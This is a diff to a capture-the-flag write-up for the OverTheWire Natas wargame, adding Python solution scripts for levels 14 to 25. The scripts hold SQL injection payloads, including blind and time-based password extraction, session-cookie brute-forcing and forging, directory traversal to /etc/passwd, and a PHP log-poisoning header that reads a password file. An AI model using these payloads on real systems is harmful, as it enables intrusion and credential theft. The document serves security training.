@@ -22,18 +22,17 @@ https://overthewire.org/wargames/natas/
 ```python
 import requests
 
-def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}, url="", redirect=True):
+def natasX(x, pwd, endpoint="", headers={}, cookies={}, param={}, data={}, url="", redirect=True):
     if url != "":
         username = f"natas{x}"
-        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data, allow_redirects=redirect)
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=param, data=data, allow_redirects=redirect)
     else:
         url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
         username = f"natas{x}"
 
-        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data, allow_redirects=redirect)
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=param, data=data, allow_redirects=redirect)
 
     return r
-
  ```
 
 ## Natas0
@@ -699,7 +698,8 @@ import natasX
 
 natas = natasX
 
-print(natas.natasX(14, "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1", endpoint="index.php?debug=yes", data={"username": "hello\" OR \"natas12", "password": "1234\" OR 1=1 OR \"test"}).text)
+print(natas.natasX(14, "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1", endpoint="index.php?debug=yes",
+                   param={"username": "hello\" OR \"natas12", "password": "1234\" OR 1=1 OR \"test"}).text)
 ```
 
 **Output**
@@ -724,28 +724,32 @@ import natasX
 
 natas = natasX
 
-#print(natas.natasX(15, "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J", endpoint="index.php?debug=yes", data={"username": "natas16\" AND SUBSTRING(password, 1, 1)=\"W"}).text)
+# print(natas.natasX(15, "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J", endpoint="index.php?debug=yes", data={"username": "natas16\" AND SUBSTRING(password, 1, 1)=\"W"}).text)
 
 w = ""
 
-for i in range(1,70):
+for i in range(1, 70):
 
     for n in range(26):
         if natas.natasX(
                 15,
                 "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65+n)}'}).text.__contains__("<br>This user exists.<br>"):
-            print(f'{i} {chr(65+n)}')
-            w += chr(65+n)
+                param={
+                    "username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65 + n)}'}).text.__contains__(
+            "<br>This user exists.<br>"):
+            print(f'{i} {chr(65 + n)}')
+            w += chr(65 + n)
             break
 
         if natas.natasX(
                 15,
                 "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97+n)}'}).text.__contains__("<br>This user exists.<br>"):
-            print(f'{i} {chr(97+n)}')
+                param={
+                    "username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97 + n)}'}).text.__contains__(
+            "<br>This user exists.<br>"):
+            print(f'{i} {chr(97 + n)}')
             w += chr(97 + n)
             break
 
@@ -755,7 +759,9 @@ for i in range(1,70):
                     15,
                     "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                     endpoint="index.php?debug=yes",
-                    data={"username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__("<br>This user exists.<br>"):
+                    param={
+                        "username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__(
+                "<br>This user exists.<br>"):
                 print(f'{i} {chr(48 + k)}')
                 w += chr(48 + k)
 
@@ -921,9 +927,9 @@ natas = natasX
 
 w = ""
 
-#print(natas.natasX(17, "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw", endpoint="index.php?debug=yes", data={"username": f'natas18" AND BINARY password LIKE "{w}%" AND SLEEP(2) #'}).text)
+# print(natas.natasX(17, "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw", endpoint="index.php?debug=yes", data={"username": f'natas18" AND BINARY password LIKE "{w}%" AND SLEEP(2) #'}).text)
 
-for i in range(1,70):
+for i in range(1, 70):
 
     for n in range(26):
         start = time()
@@ -931,12 +937,12 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65+n)}%" AND SLEEP(2) #'}
+            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65 + n)}%" AND SLEEP(2) #'}
         )
         end = time()
         if end - start > 1.5:
-            print(f'{w}{chr(65+n)}')
-            w += chr(65+n)
+            print(f'{w}{chr(65 + n)}')
+            w += chr(65 + n)
             break
 
         start = time()
@@ -944,11 +950,11 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(2) #'}
+            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(2) #'}
         )
         end = time()
         if end - start > 1.5:
-            print(f'{w}{chr(97+n)}')
+            print(f'{w}{chr(97 + n)}')
             w += chr(97 + n)
             break
 
@@ -958,7 +964,7 @@ for i in range(1,70):
                 17,
                 "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(2) #'}
+                param={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(2) #'}
             )
             end = time()
             if end - start > 1.5:
@@ -1021,10 +1027,11 @@ import natasX
 
 natas = natasX
 
-#print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "natas19", "password": ""}))
+# print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "natas19", "password": ""}))
 
 for i in range(1, 640):
-    print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{i}'}).text)
+    print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php",
+                       param={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{i}'}).text)
 ```
 
 **Output**
@@ -1066,13 +1073,13 @@ import natasX
 
 natas = natasX
 
-#print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))
+# print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))
 
 for i in range(280, 282):
     charHex = f'{str(i).encode("utf-8").hex()}2d61646d696e'
     print(charHex)
     print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php",
-                       data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": charHex}).text)
+                       param={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": charHex}).text)
 ```
 
 **Output**
@@ -1120,7 +1127,7 @@ natas = natasX
 
 print(natas.natasX(20, "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF",
                    endpoint="index.php",
-                   data={"debug": "", "name": "admin\nadmin 1"},
+                   param={"debug": "", "name": "admin\nadmin 1"},
                    cookies={"PHPSESSID": "q8k4kl3ar05rkga90rtib0ros1"}).text)
 
 ```
@@ -1172,8 +1179,10 @@ import natasX
 
 natas = natasX
 
-sid = natas.natasX(21, "IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", url="http://natas21-experimenter.natas.labs.overthewire.org", data={"submit": "1", "admin": "1"}).cookies.get("PHPSESSID")
-print(natas.natasX(21,"IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", cookies={"PHPSESSID": sid}).text)
+sid = natas.natasX(21, "IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php",
+                   url="http://natas21-experimenter.natas.labs.overthewire.org",
+                   param={"submit": "1", "admin": "1"}).cookies.get("PHPSESSID")
+print(natas.natasX(21, "IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", cookies={"PHPSESSID": sid}).text)
 ```
 
 **Output**
@@ -1353,6 +1362,22 @@ https://overthewire.org/wargames/natas/natas25.html
 > URL:      http://natas25.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+#print(natas.natasX(25, "GHF6X7YwACaYYssHVY05cFq83hRktl4c", endpoint="?lang=....//....//....//....//....//....//etc/passwd").text)
+
+cookie = natas.natasX(25, "GHF6X7YwACaYYssHVY05cFq83hRktl4c").cookies.get("PHPSESSID")
+print(cookie)
+
+print(natas.natasX(
+    25,
+    "GHF6X7YwACaYYssHVY05cFq83hRktl4c",
+    endpoint=f'?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookie}.log',
+    cookies={"PHPSESSID": cookie},
+    headers={"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
+).text)
 ```
 
 **Output**
@@ -1381,6 +1406,41 @@ for who you are.
 ```
 
 ```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas25", "pass": "GHF6X7YwACaYYssHVY05cFq83hRktl4c" };</script></head>
+<body>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<option>en</option><option>de</option></select>
+</form>
+</div>
+
+[17.07.2022 16::01:31] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+ "Directory traversal attempt! fixing request."
+<br />
+<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
+<h2></h2><br />
+<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
+<p align="justify"><br />
+<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
+<div align="right"><h6></h6><div><p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
 ```
 
 ## Natas26
